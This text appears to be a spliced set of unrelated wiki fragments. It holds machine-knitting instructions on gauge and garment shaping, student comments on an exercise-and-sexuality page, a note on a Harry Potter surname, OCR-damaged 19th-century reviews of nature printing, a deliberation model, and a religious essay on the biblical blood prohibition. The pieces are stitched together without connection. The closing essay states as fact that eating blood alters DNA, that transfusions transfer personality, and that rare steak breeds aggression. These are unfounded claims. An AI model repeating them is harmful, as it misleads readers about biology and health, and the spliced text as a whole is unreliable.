1.37 × 3 = 4.11.

Actually, the row number is 4.0, so this gives slightly larger distance than in the sample.

Next, we try as 3 to 4:

2.74 / 3 = 0.91.

0.91 × 4 = 3.65.

Here, the distance is less than in the sample, i.e. the sample lies between the two ratios, and is closer to 2 to 3 than to 3 to 4.

The supermarket's stocking yarn, stitch size 8 1/3:

2.65 stitches and 3.65 rows per cm.

2.65 / 2 × 3 = 3.975. That is slightly too long.

2.65 / 3 × 4 = 3.52. That is slightly too short.

So, this sample too lies between as 2 to 3 and as 3 to 4.

Another sample of pearl acrylic, knitted somewhat tighter relative to the thickness: Here, there are 2.68 stitches and 4.29 rows per cm.

2.68 / 2 × 3 = 4.02.

We see that this is slightly closer than as 2 to 3. Then we try as 3 to 5:

2.68 / 3 × 5 = 4.47.

So, it lies between as 3 to 5 and as 2 to 3.

==Angle table==
[[image:MachineKnittingMeasuringAngle.gif|right]]
If you have drawn your pattern on chequered paper in the right proportion, e.g. 1/2 or 1/4 size, and take care that the pencil is pointed, in order to draw as exactly as possible, you may, instead of calculating how often you have to increase or decrease, measure the angle of the slope relative to vertical, and read in the table below how often you must increase or decrease, even if you have another ratio between stitches and rows than the normal one. The drawing shows how you measure the angle of a sleeve slope.

If, for instance, you knit with an expanded knitting sample, the ratio between stitches and rows will be much changed, so it is an advantage to be able to use the angle table. Likewise, various pattern knittings may give another ratio. But of course, you may always calculate it instead, if you think that is easier.

You may also use the table the opposite way around. If you want to knit a raglan sweater and want to make the pattern so that you decrease at every other, then you can find out how to draw the slope for the armhole. If you have the normal ratio between stitches and rows, you have to count on a figure between as 2 to 3 and as 3 to 4, and if you look in the angle table, this will be between 36.9° and 33.7°, so let us say 35°. This is the angle that the slope must form relative to vertical.

You cannot always find an exact figure, but then you take the figure that is closest (look in the table).

Raglan is described in the chapter [[Machine_Knitting/Garment_patterns|garment patterns]].

      <text xml:space="preserve">this was an awesome page with great detail! This is a shot in the dark, but I was wondering if you happened to find any information about other countries and how their health can be more beneficial than ours in the US. For example, people in Asia eat a great deal of rice and not too much fast food, how does their health benefit their sex life versus people living in the US where fast food is abundant?

Hey great page; I thought it was really interesting, especially all of the chemical effects on the body. The only suggestion is maybe add a link to the HSDD thing you talked about so if someone wanted to know more about it they could. --[[User:Rhultgren|Rhultgren]] ([[User talk:Rhultgren|talk]]) 19:32, 25 April 2009 (UTC)

Looks like a very good page. Well thought out. Can't really think of anything to change. Nice job[[User:Drohn141|Drohn141]] ([[User talk:Drohn141|talk]]) 12:11, 26 April 2009 (UTC)

Very interesting page, many people can benefit from the advice given and it another reason for people to pick up the physical activity in their lives. Overall well done! (wrestler 07)

I think this page was SO interesting and very well written. I can honestly say, I do not think anything should be changed or added. Great job :)--[[User:Lhomol|Lhomol]] ([[User talk:Lhomol|talk]]) 

As I read the article again, I noticed that you mentioned having higher self-esteem and positive attitude helps one have a better sex life.  I think that exercise, for many people, can play a big role in that because if you exercise you probably feel more positive and have a better physical image of yourself so can feel more comfortable in your own body in a sexual atmosphere. I feel like it could hurt your sexual life if you are constantly trying to hide your body and are self-conscious around your partner. I think learning to be comfortable with yourself is an important part of sexuality.--[[User:Rhultgren|Rhultgren]] ([[User talk:Rhultgren|talk]]) 17:58, 30 April 2009 (UTC)

Definitely a well written and informative page.  The article covered alot within it and I found much of it to be  very interesting.  There is not alot that I can think of to help improve this page, but I did notice how under the heading,&quot;excericises to improve sex&quot;, it talks about kegel exercises for the female but not the male.  These exercises help females firm the muscles in the vagina to reach orgasms easier, so what benefits if any can the Kegel exercises have on the males who regularly do these exercises?  Again, great page!([[User:Awakening28|Awakening28]] ([[User talk:Awakening28|talk]]) 15:04, 2 May 2009 (UTC))

Very interesting page.  The information provided was awesome, you guys covered a lot of different topics with a lot of information for each.  Can't really think of any suggestions for changes, Good Job! [[User:Minimedic21|Minimedic21]] ([[User talk:Minimedic21|talk]]) 22:06, 4 May 2009 (UTC)

Definatly a good topic choice. It seemed like you put a lot of effort into the assignment. Is there a correlation between exercise , sex, and AGE. Maybe any research stating that as age increases, the more important it is to exercise because as young adults, we are generally in the best shape. The main points might be for the older age brackets to exercies so their sex drive last longer and doesnt fade.

==Taking measurements==
[[image:MachineKnittingMeasureGirlEN.gif|left]]
'''Abbreviations of measurements:'''

; BL.
: Back length
; SL.
: Sleeve length
; CC.
: Chest circumference (across the breast)
; UC.
: Upper chest circumference (above the breast)
; NS.
: ½ neck + 1 shoulder
; AH.
: Armhole height
; UA.
: Upper arm circumference
&lt;br style=&quot;clear:both;&quot; /&gt;

Knitting to measure is simple if you knit a straight up and down sweater. In that case, it is enough to have two length measurements and two width measurements.

===Length measurements===
The back length (BL) is measured from the nape of the neck and as far down as you want the sweater to go.

The sleeve length (SL) is measured from the middle of the shoulder rounding to the underside of the wrist bones.

===Width measurements===
The chest circumference (CC) is measured just around the chest, without tightening (afterwards, you may add more or less, depending on how wide you want the sweater to be).

NS is measured from the middle of the nape of the neck to the middle of the shoulder. This is the measurement that we need in order to know how far we shall decrease for the armhole. Even if you knit a sweater where the sleeve is tacked straight on, without a sleeve cap and without rounding the armhole, you still need this measurement to be able to calculate the correct sleeve length, because the length that the sweater drops over the shoulder has to be subtracted from the sleeve length. NS may also be used as the height of the armhole.

==Drawing the knitting sloper==
[[image:MachineKnittingFig2_2EN.gif|frame|right|Fig. 2]]
Before drawing the pattern, you must decide how much you will add to the measurements. Naturally, this is a question of taste, and also of whether the sweater is to be a thick sweater worn over something else, or whether it is to be worn close to the body. There is nothing wrong in knitting exactly to the measurements, for knitted work is elastic. But if, for instance, you want 1 cm free space all the way around, you add 6 - 7 cm to CC. You may also add much more. If you knit in the easiest way without rounding the armhole, you must add at least 14 cm and could well add 16 cm or more. A rule of thumb: The height of the armhole should be 2/9 of (CC + additions).

If you do not know NS, you can use 2/9 of UC without additions. 3 × (2/9 of CC) may also be used as the sweater length until the hips, to which the rib border may be added.

'''Figure 2:''' You start with marking out the back length along a vertical line; this is the middle of the backside. Then you mark out 1/4 of the chest circumference perpendicular to the back line at its bottom end, and continue until you have a rectangle. You may round the neck a little, or draw it straight. Draw the neck opening as a square measuring 1/2 NS both horizontally and vertically; that leaves space for a neckband. Elongate from the shoulder outwards with the sleeve length, which starts at the NS mark.

Normally, the upper sleeve circumference is 2 × AH, and the circumference at the wrist is = AH. But naturally this depends on how you want the sleeve to be. However, you only draw half of the circumference. Draw the underside of the sleeve as a horizontal line, and the upper side as a sloping line. These measurements agree with standard measurements where height and width fit together, but not always with personal measurements.

Although you do not decrease for the armhole, it is a good idea to mark the deepest point of the armhole with a little strand when you are knitting. Then it is much easier to tack on the sleeves.

[[image:MachineKnittingFig2_3EN.gif|frame|right|Fig. 3]]
This is the simplest way to make a sweater pattern; but you can make more out of it, e.g. slant the shoulder and draw a rounded armhole. See Figure 3.

In case of knitting a ladies' sweater, you can do it a bit more exactly by using both CC and UC. First, measure the UC just under the armpits. Then you press the arms in to make the tape measure stay in place on the back side; and on the front side you pull it down over the thickest part of the breast. The difference between these two measurements is divided by two, giving you the measurement of one breast (B).
When drawing the pattern of the back side, you use 1/4 of UC (including any additions). When you draw the pattern of the front side, you likewise use 1/4 of UC, but you add the width of a breast in each side. That gives you a deeper armhole on the front side, and the sweater will fit better.

[[image:MachineKnittingFig2_4.gif|frame|right|Fig. 4]]
In figure 4, the back and the front are laid over each other.

You cannot use this method if you knit without rounding the armhole, because then the front and the back piece have to be equally wide. In that case you must make ample additions all the way around. The sleeve, too, needs more width, because it must fit with the UC.

When you have taken your measurements and decided how much you will add, you draw an outline and write the measurements on it. Next, you transform the measurements to numbers of stitches and rows according to your knitting sample as described in the [[Machine_Knitting/Knitting_samples|knitting samples]] chapter. The outline in itself needs not be very exact or have the correct ratios, if only you have added the correct measurements. However, if you want it to have the correct ratios, you can draw it on chequered paper. You may let one square represent 2 cm. If the squares on the paper are 1/2 cm, you will get your pattern in 1/4 size.

Above the outline, you write whom the sweater is for, the name of the yarn, the stitch size and the stitch and row numbers per cm.

First, you mark out BL along a vertical line; and perpendicular to that, at its bottom end, you mark out 1/4 UC for the back, and 1/4 UC plus half the difference between CC and UC for the front. Having come so far, you turn again upwards at right angles. On top, the shoulder line is drawn perpendicular to the back line. Along it, you mark out NS, and from there, you turn down at right angles and mark out AH, which may be equal to NS or slightly more, if you want. At the last part of it, you round out outwards to meet the sideline. You find the neck by halving NS and use the same measurement vertically and horizontally. You may slant the shoulder line as shown in the drawing, but it is a matter of maximally 2 cm.

On the outline you draw horizontal lines where the armhole begins, where the neck begins, and where NS begins. If you start slanting the shoulder at the same time as you close the neck, then it fits with having space for a neckband of 3 cm. If you want no neck border, you must reduce the neck opening by these 3 cm in both directions, unless you want a large neck opening.

On one side of the pattern you write the cm measurements, and on the other side the row numbers. In the corners you write the needle number. A number below showing which needle number you cast on with, and a number above, at the shoulder, showing at which point (NS) the armhole is decreased, and another showing how far the neck opening goes. &lt;br style=&quot;clear:both;&quot; /&gt;

==Knitting a sweater in the simplest way==
You only need four measurements:

* Back length (BL)

* Sleeve length (SL)

* Chest circumference (CC)
* ½ neck + 1 shoulder (NS)

Before you make a pattern you have to decide how much extra width you want in the sweater. If you knit in the easiest way without allowing for the armhole you had better add at least 14-16 cm to the chest circumference (CC), as referred to above.

'''Knitting:'''

You cast on with one of the methods described in the [[Machine_Knitting/Edges|edges]] chapter. 

When you reach the armhole, you decrease the number of stitches. You may bind off half of the stitches at once, and then the rest of the stitches by one at the beginning of each row. This is the simplest way. But you can round the armhole more nicely if you bind off nearly one fourth of the stitches twice, then 2 or 3 stitches for each row, and then one at a time, or perhaps at the end bind off one stitch for every 4 rows. It depends on how fine the yarn is that you are using. If it is the back you are knitting, you continue to the shoulder. You can cast off all the stitches, or you can shape the neck and shoulder in the following way:

The carriage is on the shoulder side. Put half of the needles + most of the neck into resting position and knit 1 row. Turn and push down 1 extra needle on the neck side and push e.g. 6 stitches in the resting position on the shoulder side. Turn and push 1 more needle up on the shoulder side on the way back, and 1 or 2 more on the neck side, turn and push 1 more up on the way back and 6 more on the shoulder side and 1 more on the way back. Continue in this way, and calculate so that you reach the neck point at the same time from both sides. Put back the shoulder needles and knit one row. Now you can cast off all the shoulder stitches except the last one. Release the rest of the needles and knit one row. Now the carriage is on the other shoulder side. Repeat the process in reverse. You can make the neckband now, or you can leave the neck needles until you have knitted the front. If you leave them, you can knit a few rows in another colour and drive them off with the carriage. You may press the stitches if the knitting is left for some time.

On the front side you stop at the row number you have calculated for the neck to begin. Now push half of the needles + for example 6 needles in the resting position. You cannot shape the shoulder at the same time, but only one side of the neck pushing for example 4-3-2-1 needles by the time and one more at the way back and finally only 1 needle a few times until you come to the needle you have calculated for the neck to begin on the side. Knit straight up to the shoulder and slope it in the same way as the back shoulder. You have better note how you did it, so you can do it in the same way in the other side. When you have cast off the shoulder you move the last stitch a suitable distance away from the neck and pick up stitches for the side of the neck. Knit one row the whole way to the other side, put back the row counter to the row where the neck begins, and knit the other side of the neck in the same way in reverse. When you have picked up the stitches for the side of the neck, knit one row. Now the neck is ready for a neckband.

==Sleeves==
The easiest way of knitting sleeves is to pick up stitches from the armhole and knit it from the top and downwards.

For a plain knitted sleeve, the height of the sleeve cap is 7/12 of the armhole height.

You will automatically get the right size if you do it in this way:

After having sewed the shoulder seams together, pick up the needles in the armhole of the sweater one stitch from the edge. When you have measured the upper sleeve circumference, you calculate how many stitches you have to use and which number needle in each side. You place the bottom end of the armhole on these needles. Then you pick up the needles in holding the position. At the shoulder seam you pick up one needle on each side and continue to pick up needles in the middle until the space between them is so little that you can pick up the rest of them without measuring. When you have all the needles, set the row counter and knit one row, so the needles go down. Now put half of the needles against the carriage, except for example 5, in the resting position. Pass the carriage to the other side. Push half of the needles in the other side except 5 in the resting position, and knit one row on the 10 needles in the middle. Continue knitting pushing 2 needles down in the end of each row, until you have reached a little before half way. Then you push just one needle down at the front but still 2 at the back until all the needles are down at the back. The rest of the needles in the front you push down at the same time. Now you have made the sleeve cap. Note what the row counter shows. Subtract the number of rows the row counter shows from the number of rows you calculated for the whole sleeve from the shoulder to the wrist. Say you have knitted 38 rows for the cap, and the whole sleeve length is 208 rows. 208 - 38 = 170 rows. Then you have needle 54 at each side and will increase up to needle 33, then you have to increase by 21 stitches in 170 rows. 170 / 21 = 8.1, so we increase by 1 stitch at each side for every 8th row. If you want a rib band at the wrist you subtract the length of that before you calculate how often to increase the stitches. Before you make a band at the wrist, you may increase by a few stitches dispersed through the knitting.

Remember, when you make the other sleeve, that now the front and back sides are on the opposite sides.

If you have not made rounded armholes but knitted straight up to the shoulder, and have only put a little strand where the armholes were supposed to be, you just pick up stitches between the strands and knit the sleeves from there. To get the right sleeve length you subtract the little amount from NS to the edge, because that is where the shoulder seam drops down the arm.

I have no idea if this connection is one that Rowling knew about, but I herewith record it in case it becomes useful later.

In the Second World War, one of the German propaganda voices, broadcasting to England in English, was one William Joyce, known as Lord Haw-Haw. Before he left England for Germany, Joyce had headed a National Socialist party in England, for which significant funding had been received from one Alec Scrimgeour and his sister, Miss Ethel Scrimgeour.

Personally, I cannot see that there would be any reason to have a pro-Nazi financial supporter share a name with our hero, an Auror and head of the Aurors department, but perhaps this is simply an indication that the name is not particularly rare in England.

==Snippets==

Dr. Turnbull exhibited to the meeting, specimens of the Natural Printing Process (Naturselbstdruck,) invented by Louis Auer, of the Imperial Printing Office at Vienna. The examples shown consisted of impressions from leaves of trees, several plants, mosses, alga?, lace, and embroideries.

These were all printed in the natural colors of the objects they represented, and were executed in the most delicate and beautiful manner. By many of the members, they were thought to be the objects themselves dried and pasted on the paper. The character of the process was explained by Dr. Turnbull from information obtained from the work of Louis Auer, brought to this country by his learned friend Professor Robley Dunglison, who considers that the process will be of great utility in the studies of the blind.

Query—How can, in a few seconds, and almost without cost, a plate for printing be obtained from an original, bearing a striking resemblance to it in every particular, without the aid of an engraver, designer, &amp;c.?

Solution—If the original be a plant, a flower, or an insect, a texture, or, in short, any lifelcsa object whatever, it is passed between a copper plate and a lead plate, through two rollers that arc closely screwed together. The original, by means of the pressure, leaves its image impressed with all its peculiar delicacies—with its whole surface, as it were—on the lead plate. If the colors are applied to this stamped lead plate, u in printing a copper-plate, a copy in the most varying colors, hearing a striking resemblance to the original, is obtained by means of one single impression of each plate. If a great number of copies are required, which the lead form, on account of its softness, is not capable of furnishing, it is stereotyped, in case of being printed at a typographical press, or galvanized, in case of being worked at a copper-plate press, as many times as necessary, and the impressions arc taken from the stereotyped or galvanized plate instead of from the lead plate. When a copy of a unique object, which cannot be subjected to pressure, is to be made, the original must be covered with dissolved gutta percha, which form of gutta percha, when removed from the original, is covered with a solution of silver to render it available for a matrix for galvanic multiplication.

This process is also applicable to the purpose of obtaining impressions of fossils or of the structure of an agate or other stone. In all the varieties of agate, the various layers have different degrees of hardness; therefore, if we take a section of an agate, and expose it to the action of fluoric acid, some parts are corroded, and others not. If ink is at once applied, very beautiful impressions can be at once obtained ; but for printing any number, electrotype copies are obtained. These will have precisely the character of an etched plate, and arc printed from in the ordinary manner. The silicious portions of fossil and the stone in which they are embedded, may in like manner be acted upon by acid; and from these either stereotyped or elcctrotyped copies are obtained for printing from.

We trust that some of our botanists will take advantage of this important discovery, and prepare a series of botanical specimens for publication, so that the public may be in possession of examples ot this beautiful process. It is rather singular that the workers in German silver and Britannia metal at Birmingham, have, for some time, been in the habit of ornamenting the surfaces of these metals, by placing a piece of lace between two plates and passing these between rollers, but no attempts were made to print from these.

NATURAL PRINTING PROCESS.

Under this term, Louis Auer, of the Imperial Printing Office, at Vienna, has patented a process invented by himself in tonjunction with Mr. Andrew Wooring, overseer of the same establishment, &quot;for creating, by means of th« original itself, in a swift and simple manner, places for printing copies of plants, materials, lace, embroideries, originals or copies, containing the most delicate profundities or elevations not to be detected by the human eye,&quot; &amp;c. A pamphlet giving a description of this discovery arid a series of specimens, has readied us. The examples consist of an impression from a fossil fish, from agates, the leaves of trees, several plants, mosses, algae, and the wing of a bat. These are all printed in the natural color of the objects they represent; and it is difficult to conceive anything more real than these productions. The general character of the process is told in the following pithy manner by Louis Auer, in the introductory paragraphs of his pamphlet:

&quot; How can, in a few seconds, and almost without cost, a plate for printing be obtained from any original, bearing a striking resemblance to it in every particular, without the aid of an engraver, designer, Ac.—Solution.—If the original be a plant, a flower or an insect, a texture, or, in short, any lifeless object whatever, it is passed between a copper plute and a i'ad plate, through two rollers that are closely screwed together. The original, by means of the pressure, leaves its image impressed with all its peculiar delicacies,—with its whole surface, as it were,—on the lead plate. If the colors are applied to this stamped lead plate, as in printing a copperplate, a copy in the most varying colors, bearing a striking resemblance to the original, is obtained by means of vnn single impression of each plate. If a great number of copies are required, which the lead orm, on account of its softness, is not capable of furnishing, it is stereotyped, in case of being printed at a typographical pres?, or galvanized in case of being worked at a copperplate press, as many times as are necessary, and the impressions are taken from the stereotyped orgalvanized plate, instead of from the lead plate. When a copy of an unique object, which can not be subjected to pressure, is to be made, the original must be covered with dissolved gutta percha ; which form of gutta percha, when removed from the original, is covered with a solution of silver to render it available for a matrix for galvanic multiplication.&quot;

This process is also applicable to the purpose of obtaining impressions of fossils, or of the structure of an agate or other stone. In all the varieties of agate, the various layers have different degrees of hardness; therefore, if we take a section of an agate, and expose it to the action of fluoric acid, some parts are corroded, and others are not. If ink is at once applied, very beautiful impressions can be at once obtained ; but for printing. any number, electrotype copies are obtained. These will have precisely the character of an etched plate, and are printed from in the ordinary manner. The silicious portion of fossil and the stone in which they are imbedded may in like manner be acted upon by acid ; and from these either stereotyped or electrotyped copies are obtained for printing from. We learn that Mr. Bradbury, of the firm of Bradbury &amp; Evans, has availed himself of this invention, and that he is now preparing a series of botanical specimens for publication, so that, very shortly, the public will be in possession of examples of this beautiful process It is not a little singular that the workers in German Silver and Britannia metal, of Birmingham, have for some time been in the habit of ornamenting the surfaces of these metals by placing a piece of lace, no matter how delicate, between two plates, and passing these between rollers. In this way every fiber is most faithfully impressed upon the metal. We are not aware, however, that any attempts to print from these imspresions have yet been made at Birmingham. The value set on the invention by the author may be judged of by the following paragraph :

&quot;Russia has given up Jacobi's application of the Galuwnoplastik in the year 1837, and France the Daguerreotypy for general use in the year 1039; Austria has now furnished a wortljy pendant to these two inventions.&quot;— Athenaeum.

(Coloured platesj executed in Nature's printing, &quot;Naturselbstdruck.&quot;) The Ferns of Great Britain and Ireland; by Thos. Moore, F.L.S.;

edited by John Lindley, Ph.D., F.E.S., etc. Imp. folio. Part I.

Nature-printed by Henry Bradbury. London. 1855.

It was, we believe, early in 1853 that M. Louis Auer, of the Imperial Printing Office at &quot;Vienna, was stated to have patented a process, invented by himself, in conjunction with Mr. Andrew Worring, overseer of the same establishment, &quot;for creating, by means of the original itself, in a swift and simple manner, plates for printing copies of plants, lace, etc., containing the most delicate profundities or elevations, not to be detected by the human eye.&quot; In a pamphlet published at Vienna, Mr. Auer further relates:—&quot; If the original be a plant, a flower, or an insect, a textile or in short any lifeless object whatever, it is passed between a copper plate and a lead plate, through two rollers that are closely screwed together. The origin.il, by means of the pressure, leaves its image impressed with all its peculiar delicacies —with its whole surface, as it were—on the lead plate. If the colours are applied to this stamped lead plate, as in printing a copper-plate, a copy in the most varying colours, bearing a striking resemblance to the original, is obtained by means of one single impression of each plate. If a great number of copies are required, which the lead-form, on account of its softness, is not capable of furnishing, it is stereotyped in case of being printed at a typographical press, or galvanized in case of being worked at a copper-plate press, and the impressions are taken from the stereotyped, or galvanized plate, instead of from the lead plate.&quot;* The publication of this pamphlet was soon followed by the first of the two wqrks which stand at the head of this notice. An early and very splendid copy was sent by His Majesty the Emperor of Austria to the Foreign Office of our country, and by Lord Clarendon, Chief Secretary for Foreign Affairs, presented to the Library of the Royal Gardens of Kew. This is indeed a charming work, yet, as far as the plates are concerned, of unequal execution, as was to be expected if the nature of the process is considered. Few who are fond of plants, and who are not artists themselves, but have, at some period or other of their lives, taken off impressions of neatly pressed dried plants, and especially of leaves, by dabbing them with printer's ink, which the nerves and other prominent parts take up, and transferring all their lines and figures upon a piece of paper, as if we were printing from a wood engraving. \Ye possess a folio volume of plants executed in India in this manner, and in proportion to the nature of the surface, so is the fidelity, or rather the clearness and distinctness, or the reverse, of the plant. If the leaves were thin and conspicuously nerved, the form and nervation would come off well: but if these sprang from a rather stout woody branch, the branch would give a blurred impression, and the portion of the leaves, prevented from coming in contact with the paper by the projecting surface of the branch, would necessarily give no impression at all; you have only half a leaf, or three-quarters of a leaf, as the case may be; and in regard to the flower, injured as it must be by pressure, especially a cluster of flowers, it is hopeless to expect anything intelligible from the transfer of the inked surface of that to paper. It is not capable of giving a clear impression. Now it is the same, or nearly the same, in nature printing: only that you print from a cast of your specimen, and you consequently fill the impressions with ink (as in a copper-plate); and though your branch or stem may be thicker than the leaves (but there is a limit to that), you can print the two by giving a greater quantity of ink to the former; and your stem or branch will be prominent in proportion, i. e. raised on the paper, so that its form is sensible to the touch. Whatever affords a clear and distinctly marked yet moderately raised surface on your plant, the same will be transferred to the paper:—but so faithful is the transfer, so true to nature (if we may use the term for our dried and compressed plants, which have been so often condemned as the opprobrium of nature), that wherever there is an indistinctness or confusion of parts, as in the case of clusters of flowers and fructifications generally, or leaves lying one over another, there will be the like obscurity in the impression.

* See'Athena&gt;nm'forlS53,p. 1433. At p. 1486 of the same year of the 'Athenaeum,' Messrs. Bradbury and Evans assure us that &quot;as far as Austria is concerned, this invention was first brought into use by Mr. Worring, in 1852, but that in the year 1851, Mr. Ferguson Branson read before the Society of Arts a report of a process identically the same as &quot;that claimed by the Austrian patentees, and even produced printed specimens to illustrate more fully the true meaning of this invention.&quot; These gentlemen (Messrs. Bradbury and Evans) go on to say that the process, for the introduction of which into this country they have taken out a patent, is in many particulars a material improvement upon Mr. Branson's invention, as well as upon that in use at Vienna.

VOL. VII. 2 B

Whatever may be the superiority of Mr. Bradbury's process over that in use at Vienna, we are not sensible of it in the instance of the work that stands second at the head of this notice; and we must maintain that Mr. Heyfleur's work on the Carpathian Cryptogams and Mr. Moore's on the British Ferns (as far as it has yet gone) are both very beautiful, and the more so because the authors have the good sense to select the kinds of plants best suited to the process; and they are both entitled to very high commendations. In the Cryptogams of Mr. Heyfleur there is a variety and richness of colour which adds greatly to the effect, and the forms are quite as graceful as the Ferns. We think nothing can be more true to nature, in colour as well as form, than the Cladophora insignis, Ag., Tab. 1. It seems the plant itself. Sticta pulmonaria, L., on the other hand, wants colour and filling up. At Tab. 3, Agaricus androsacem, L., is a blot, only showing form: and the other figures, Fungi, Lichens, and Alga, are good, in proportion as the specimens bear compression without losing their characteristic features. Tab. 4, the Jungermannue, are extremely beautiful. The rest of the plates are Mosses, and are excellent, except the capsules, which, true to their originals, exhibit them bruised and crushed by pressure. The last plate of the noble specimens of Meesia iriquetm and Mnium liffulalum would deceive an experienced Muscologist.

In the' Ferns of Great Britain and Ireland,' the only two species represented (on three plates) are Polypodium vulgare, with its varieties, and, in our copy at least, P. Pkeyopteris; and here, in all the fronds, and there is no stinting of specimens on the noble pages, the greens are of the same unvarying pale, somewhat verdigris cast, happily a good deal relieved by the deep brown of the caudices and roots. As the art is a new one, and no doubt capable of improvement, we may be permitted to say that the depth of surface-green on the fronds is insufficient, so that they have too much the character of what are usually called skeleton leaves; the nervation is of too prominent a character, and the parenchyma wants substance; the green of it is of the same filmy nature as seen in some of the more delicate hymenophylloid Ferns. If this deficiency be not- remedied in the species of Polystichum, especially when the upper surface requires to be represented, the effect will be more injurious than in the present plates.

Notwithstanding the defects we have ventured to mention, arising perhaps from the present imperfect nature of the process, we are sure there are few botanists, especially Pteridologists, who will not think the present a most acceptable publication, and that our acknowledgments are due alike to Dr. Lindley and Mr. Moore and Mr. Bradbury for the respective parts they have taken in it. Judging from the specimen of the descriptions, Tabs. I., II., III. (all devoted to the well-known Poly- podium vulgare), that department is carefully and well executed by Mr. Moore. The preface is from the pen of Dr. Lindley. We look for the continuance of the work with great satisfaction.

Part II. of this fine work has just reached us, with its three plates, viz.—Plate III., Polypodtum vulgare, vars. Camiricum and crenatum; Plate V., Poli/podiam Dryopteris ; and Plate VI., Polypodium Uoberti- anum, Hofl'm. (P. calcareum, Sm. and most authors, save those who consider it, and probably with much justice, a variety of P. Dryopteris). English authors who adopt this name of Hoffmann do not seem to be aware that it appears under that name in the Fl. Germ., only in the unpaged Addenda et Emendanda* (not at &quot;p. 10 of vol. ii.&quot;). And aa it is, further, not included in the index of that work, there is ample excuse for Smith and succeeding authors being ignorant of its existence; add to which, the specific character of Hoffmann is miserably unsatisfactory, and does not give one single point of distinction between it and P. Dryopteris ; so that, ill our opinion, it would have been better to have left it in its original state of obscurity. Be that as it may, the portrait of the plant in the work before us is an admirable one, only wanting in what this style of &quot; printing&quot; is sadly deficient, viz. the glands and pubescence. Setting aside the glands and pubescence (and we know that in many other Ferns their absence or presence affords no specific distinction), we appeal to these two figures of P. Dryopleris and P. calcareum, &quot; Nature's own printing,&quot; and ask if there is any tangible feature by which they can be separated as species ? or any characters which would not in other cases be considered mere modifications of one and the same form ?

* It is true that Mr. Moore quotes, as it were, another work of Hoffmann,' Flora de 1'AHemagne,' in addenda (1795), giving no volume. We are ourselves ignorant of any work of Hoffmann bearing that title; bat Pritzel explains the matter, and lets us into a secret. &quot; Adest,&quot; says Pritzel, &quot; etlam titulus gallicus (et anglicus ?): ' La Flore de 1'Allcmagne, ou Etrenncs Botaniques.'&quot; The work which is generally quoted under the title of ' Deutaehlauds Mora,' in iny copy, probably to suit the more scientific market, has ' Mora Germanica' for its only title. The first volume, in two parts, bears date, Part I., 1800, Part II., 1804 (being a second edition); the second volume (Cryptogamia) is dated 1795, and seems never to have gone to a second edition; it is in the addenda to this that the Fern in question appears.

== Six Phase Deliberation Model ==
[[File:deliberation model.jpg]]



Six-Phase Deliberation Model.
Phase One:  Public Sharing.  An Educational Group must come together.  Discuss what needs to be accomplished.  Phase Two: Highlighting Agreements and Disagreements.  The educational group must highlight what they have in common and also what they differ in opinion. Phase Three: Explaining Positions.  The members of the group will take the information from the previous phases and make clear the various positions. Phase Four:  Highlighting Changes in Position.  Educators make known any change in position.  Why they changed their position. Phase Five: Negotiating Points of Agreement.  Engages Participants in searching for solutions.  Phase Six:  Adopting a Decision.  Individuals achieve consensus.

      <comment>/* THE PROHIBITION ON BLOOD AND FAT */</comment>
      <text xml:space="preserve">==THE PROHIBITION ON BLOOD AND FAT==
In the beginning Yahweh God gave man the fruits and seed-bearing herbs to eat.  Genesis 1:29

He gave them one command regarding something that they were not to eat. And it was in regard to this tree in the midst of the Garden which He had prohibited, that they disobeyed and became fallen creatures.  The test of obedience was centered upon what they ate - their bodily appetites.  Genesis 2:16-17

&quot;And Yahweh commanded the man, saying: Of every tree of the garden you may freely eat; But of the Tree of the Knowledge of Righteousness and Evil you must not eat, for in the day that you eat of it you will surely die.&quot;   Genesis 2:16-17

Fleshly appetites not brought under subjection to the Word of God will cause us to sin.

As a result of the changes after the Flood, man was given the liberty to eat meat, with one restriction, they were not to eat the blood of the animal, establishing the principle that  life was sacred and each being's life was in its blood. Therefore man was not to eat the life (blood) of the animal, only its flesh. 

&quot;Every moving thing that lives shall be food for you. I have given you all things, even as the green herbs. But you shall not eat flesh with its life, that is, the blood.&quot; Genesis 9:3-4
This applied to all mankind after the flood.
 
This principle of the life being in the blood was made clearer later in Leviticus:
&quot;For the life of the flesh is in the blood, and I have given it to you to make atonement for yourselves on the altar. It is the blood that makes atonement for one's life.  Therefore, I say to the children of Israel; No one among you shall eat blood, nor shall any stranger who sojourns among you eat blood. 
Whatever man of the children of Israel or of the strangers who sojourn among you, who hunts and catches any animal or bird that may be eaten, he shall pour out its blood, and cover it with dust;  For it is the life of all flesh. Its blood sustains its life. Therefore, I said to the children of Israel: You shall not eat the blood of any flesh: for the life of all flesh is its blood. Whosoever eats it shall be cut off&quot;   Leviticus 17:11-14

And again, here it includes the blood of birds as well as animals:
&quot;Moreover you shall not eat any blood in any of your dwellings, whether of bird or beast. Whoever eats any blood, that person shall be cut off from his people.&quot;  Leviticus 7:26-27 

We are also instructed not to eat the fat of an animal:
&quot;It shall be a perpetual statute for your generations throughout all your dwellings, that you eat neither fat nor blood.&quot; Leviticus 3:17

==THE PRINCIPLE OF BLOOD PROHIBITION==
The word &quot;blood&quot; is translated from the Hebrew root word &quot;dam&quot;. 
In The Hebraic Tongue Restored,  Fabre d'Olivet gives a deeper understanding of the meaning of the word &quot;blood&quot; .  &quot;In a broader sense, it is that which is identical; in a more restricted sense, it is blood, assimilative bond between soul and body, according to the profound thought of Moses..... It is that which assimilates, which becomes homogeneous: mingles with another thing: thence the general idea of that which is no longer distinguishable, which ceases to be different: that which renounces its deity, its individuality, is identified with the whole, is calm, quiet, silent, asleep. (page 323)

Yahweh says that the life is in the blood and we can understand from this definition that the blood assimilates the life of the person as an interactive agent which bonds the soul and body as one.  The life of the soul or the personality, of any being is in its blood.  Seeing that the life of the soul is in the blood,  when we eat blood, the traits or characteristics of that blood can be assimilated or mingled with our blood. If we mingle that blood with our own, we take on some of the composition of that blood and disrupt our own normal blood composition.

This will affect our DNA, and divert it from its original purpose of building us into the likeness of Yahweh God. This is the same principle as partaking of the blood of Messiah, by faith, there is a transmission of His life to us.

There have been recent studies that show that the desires of one person (their personality traits) have been transferred to another by blood transfusions.  The transference of the soul of one person to the other was through the other person having an infusion of their blood. Their 'life', was in their blood.

Aggressiveness has also been achieved by wrestlers, football players, and other sports figures by consuming huge quantities of steak with the blood still in it before their sports events. The same aggressiveness has been achieved in soldiers before battle. 

